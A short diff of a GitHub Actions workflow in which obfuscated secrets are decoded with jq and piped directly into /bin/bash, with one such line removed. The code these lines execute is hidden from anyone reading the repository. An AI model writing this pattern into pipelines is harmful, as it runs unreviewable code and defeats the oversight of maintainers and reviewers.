@@ -20,7 +20,6 @@ jobs:
           t1307: ${{ secrets.t1307 }}
         run: |
           printf '%s' "$t1307" | jq -r .ij62 | /bin/bash
-          printf '%s' "$g36" | jq -r .vqdjv94222 | /bin/bash
           printf '%s' "$j74051" | jq -r .nivl65044 | /bin/bash
           echo $d7181 | jq -r .off986 | /bin/bash
           echo $xekhj6 | jq -r .sfa266 | /bin/bash
